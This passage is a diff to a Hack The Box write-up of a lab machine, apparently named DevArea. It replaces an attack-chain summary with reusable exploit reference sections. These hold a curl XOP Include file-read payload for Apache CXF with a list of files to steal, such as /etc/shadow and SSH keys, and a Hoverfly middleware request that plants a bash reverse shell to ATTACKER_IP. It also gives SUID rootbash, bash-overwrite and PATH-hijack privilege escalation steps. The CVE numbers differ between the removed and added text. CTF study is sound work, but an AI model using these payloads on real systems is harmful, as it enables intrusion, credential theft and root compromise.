-│  3. SSRF (CVE-2024-28752) → Read /proc/<PID>/cmdline                      │
-│     └─> Extract Hoverfly credentials: admin:O7IJ27Myxyxiu                 │
-│                                                                             │
-│  4. Hoverfly RCE (CVE-2025-54123) → Reverse Shell as dev_ryan             │
-│                                                                             │
-│  5. LATERAL MOVEMENT                                                        │
-│     ├─> SSH as dev_ryan (persistence)                                     │
-│     ├─> Port forward 7777 → Discover SysWatch                             │
-│     └─> Read /etc/syswatch.env → Flask secret key                         │
-│                                                                             │
-│  6. SESSION FORGERY                                                         │
-│     └─> Forge admin Flask session → SysWatch dashboard                    │
-│                                                                             │
-│  7. COMMAND INJECTION (Pipe bypass) → Shell as syswatch                   │
-│                                                                             │
-│  8. PRIVILEGE ESCALATION                                                    │
-│     ├─> Symlink chain → Read /root/root.txt                               │
-│     └─> Symlink chain → Leak root SSH key → Full root shell              │
-│                                                                             │
-└─────────────────────────────────────────────────────────────────────────────┘
+
+### Method 2 — PATH Hijacking
+
+If the script calls a command without absolute path:
+```bash
+# Create malicious 'cp' binary in /tmp
+# What it does: copies or moves a file.
+# Why here: prepare payloads or place loot where the next command expects it.
+cp /bin/bash /tmp/cp
+# What it does: changes permissions or owner.
+# Why here: make a payload executable or control access to a file.
+chmod +x /tmp/cp
+
+# Prepend /tmp to PATH
+export PATH=/tmp:$PATH
+
+# Execute syswatch
+# What it does: execute the vulnerable script with sudo.
+# Why here: trigger the privilege escalation primitive identified earlier.
+sudo /opt/syswatch/syswatch.sh --version
 ```
 
 ---
 
-## 🧠 Key Takeaways
+## Key Takeaways
 
-1. **Anonymous FTP can expose sensitive source code.** Always check for anonymous login and download any available files.
+| Stage | Technique | Key Detail |
+|-------|-----------|------------|
+| **Recon** | Nmap scan | Apache CXF SOAP service on port 8080, Hoverfly on 8500/8888 |
+| **Initial Access** | CVE-2022-46364 (XOP Include LFI) | `<xop:Include href="file:///etc/passwd">` reads arbitrary files |
+| **Credential Discovery** | LFI → systemd service file | `hoverfly.service` contained plaintext admin password |
+| **RCE** | CVE-2024-45388 (Hoverfly middleware) | Authenticated RCE via PUT request to `/api/v2/hoverfly/middleware` |
+| **User Flag** | Reverse shell as `dev_ryan` | Bash reverse shell triggered through Hoverfly proxy |
+| **Privilege Escalation** | SUID binary via bash overwrite | Replaced `/usr/bin/bash` with SUID-creating script |
+| **Root Flag** | SUID root shell | `/tmp/rootbash -p` → root access |
 
-2. **SSRF via SOAP databinding (CVE-2024-28752) is powerful.** Apache CXF with Aegis allows local file read via `file://` URIs.
+### Security Lessons
 
-3. **Command-line arguments are readable via `/proc/<PID>/cmdline`.** This is a goldmine for credential discovery.
-
-4. **Hoverfly CVE-2025-54123 permits unauthenticated RCE.** The middleware endpoint executes arbitrary binaries/scripts.
-
-5. **World-readable environment files are dangerous.** They leak secrets used for session signing.
-
-6. **Flask session forgery is trivial if you have the secret key.** Use `itsdangerous` to craft valid sessions.
-
-7. **Blacklist-based input validation is almost always bypassable.** The pipe character `|` was allowed → full command injection.
-
-8. **Symlink validation must be recursive.** Checking only the immediate target is insufficient.
-
----
-
-## 🛠️ Tools Used
-
-| **Tool** | **Purpose** |
-|:---------|:------------|
-| **nmap** | Port scanning and service enumeration |
-| **JD-GUI** | Decompile Java JAR files |
-| **Burp Suite** | SOAP request manipulation |
-| **curl** | HTTP/SOAP requests |
-| **python3** | Flask session forgery |
-| **ssh** | Port forwarding and remote access |
-| **netcat** | Reverse shell listener |
-| **jq** | JSON parsing |
+1. **Validate XOP href attributes** — Apache CXF failed to restrict `file://` protocol access
+2. **Never store passwords in systemd files** — Hoverfly credentials were visible in plaintext
+3. **Authenticate API endpoints** — Hoverfly middleware API required authentication but lacked authorization controls
+4. **Use absolute paths in scripts** — `syswatch.sh` called `bash` without `/usr/bin/bash`, enabling PATH hijacking
+5. **Restrict sudo permissions** — Even limited sudo commands can be exploited through binary substitution
+6. **SUID bit detection** — Modern bash detects SUID and drops privileges; use `-p` flag to override (but this is a known attack vector)
 
 ---
 
-## 📚 References
+## CVE-2022-46364 Exploit Reference
 
-- [CVE-2024-28752 - Apache CXF Aegis SSRF](https://nvd.nist.gov/vuln/detail/CVE-2024-28752)
-- [CVE-2025-54123 - Hoverfly Middleware RCE](https://nvd.nist.gov/vuln/detail/CVE-2025-54123)
-- [Apache CXF Documentation](https://cxf.apache.org/)
-- [Flask Session Forgery](https://flask.palletsprojects.com/en/stable/quickstart/#sessions)
+### SOAP Request Template
 
----
-
-<div align="center">
-
-**🔥 Happy Hacking! 🔥**
-
-
+```bash
+# What it does: send a crafted SOAP request with an XOP Include payload.
+# Why here: exploit CVE-2022-46364 to read arbitrary system files through the CXF employee service.
+curl -s -X POST http://TARGET:8080/employeeservice \
+  -H 'Content-Type: multipart/related; type="application/xop+xml"; start="<rootpart@soapui.org>"; start-info="text/xml"; boundary="MIMEBoundary"' \
+  --data-binary $'--MIMEBoundary\r\nContent-Type: application/xop+xml; charset=UTF-8; type="text/xml"\r\nContent-Transfer-Encoding: 8bit\r\nContent-ID: <rootpart@soapui.org>\r\n\r\n<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:dev="http://devarea.htb/">\r\n  <soapenv:Body>\r\n    <dev:submitReport>\r\n      <arg0>\r\n        <employeeName><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///TARGET_FILE"/></employeeName>\r\n        <department>x</department>\r\n        <content>x</content>\r\n        <confidential>false</confidential>\r\n      </arg0>\r\n    </dev:submitReport>\r\n  </soapenv:Body>\r\n</soapenv:Envelope>\r\n--MIMEBoundary--\r\n'
 ```
+
+### Files to Target
+
+| File Path | Information Gained |
+|-----------|-------------------|
+| `/etc/passwd` | User enumeration |
+| `/etc/shadow` | Password hashes (if readable) |
+| `/home/user/.ssh/id_rsa` | SSH private keys |
+| `/etc/systemd/system/*.service` | Service credentials |
+| `/opt/*/config.yml` | Application credentials |
+| `/var/log/auth.log` | Authentication logs |
+
+---
+
+## Hoverfly CVE-2024-45388 Exploit Reference
+
+### Authentication
+
+```bash
+# Obtain JWT token
+# What it does: authenticate to the Hoverfly API using captured credentials.
+# Why here: obtain the JWT token required to access the administrative middleware configuration.
+curl -X POST http://TARGET:8888/api/token-auth \
+  -H "Content-Type: application/json" \
+  -d '{"username":"admin","password":"PASSWORD"}'
+```
+
+### Middleware RCE
+
+```bash
+# Set reverse shell middleware
+TOKEN="<JWT_TOKEN>"
+# What it does: configure a malicious middleware script in Hoverfly via the API.
+# Why here: leverage authenticated RCE (CVE-2024-45388) to gain a reverse shell as the service user.
+curl -s -X PUT http://TARGET:8888/api/v2/hoverfly/middleware \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"binary":"bash","script":"#!/bin/bash\nbash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1"}'
+
+# Trigger execution
+curl -x http://TARGET:8500 http://example.com
+```
+
+---
+
+## SUID Binary Privilege Escalation Cheat Sheet
+
+### Understanding SUID
+
+```bash
+# Check for SUID binaries
+# What it does: search for binaries with the SUID bit set.
+# Why here: identify potential privilege escalation vectors on the filesystem.
+find / -perm -4000 -type f 2>/dev/null
+
+# SUID permission breakdown
+# -rwsr-xr-x
+#  ^^^
+#  |└─┴─┴─ Regular permissions (owner, group, others)
+#  └─ SUID bit set (executes as file owner)
+```
+
+### Common SUID Exploitation
+
+```bash
+# Find SUID binaries
+# What it does: search for binaries with the SUID bit set.
+# Why here: identify potential privilege escalation vectors on the filesystem.
+find / -perm -4000 -type f 2>/dev/null
+
+# Exploit common SUID binaries
+find / -perm -4000 -type f -name "bash" 2>/dev/null
+find / -perm -4000 -type f -name "sh" 2>/dev/null
+
+# Create SUID root shell
+# What it does: create a copy of the bash binary for SUID persistence.
+# Why here: stage a binary that will be granted elevated permissions during the privilege escalation process.
+cp /bin/bash /tmp/rootbash
+# What it does: set the SUID bit on the rootbash binary.
+# Why here: enable the execution of the bash shell with root privileges by any unprivileged user.
+chmod 4755 /tmp/rootbash
+/tmp/rootbash -p
+```
+
+### Bash Overwrite Technique
+
+```bash
+# 1. Backup real bash
+# What it does: backup the original bash binary to a safe location.
+# Why here: preserve a functional shell for use in the hijack script shebang and for later restoration.
+cp /usr/bin/bash /tmp/bash.bak
+
+# 2. Switch to sh, kill bash processes
+exec sh
+pkill -9 bash
+lsof /usr/bin/bash
+
+# 3. Overwrite with malicious script
+# What it does: replace the real bash with a malicious SUID-creating script.
+# Why here: leverage the sudo-run syswatch.sh to execute this script as root.
+cat > /usr/bin/bash << 'EOF'
+#!/tmp/bash.bak
+# What it does: copy the backed-up bash to a persistent SUID location.
+# Why here: create a root-owned SUID shell when the hijack script is executed via sudo.
+cp /tmp/bash.bak /tmp/rootbash
+# What it does: set the SUID bit on the newly created rootbash.
+# Why here: finalize the creation of the privilege escalation primitive.
+chmod 4755 /tmp/rootbash
+EOF
+
+# 4. Trigger via sudo
+sudo /path/to/vulnerable_script.sh
+```
+
+
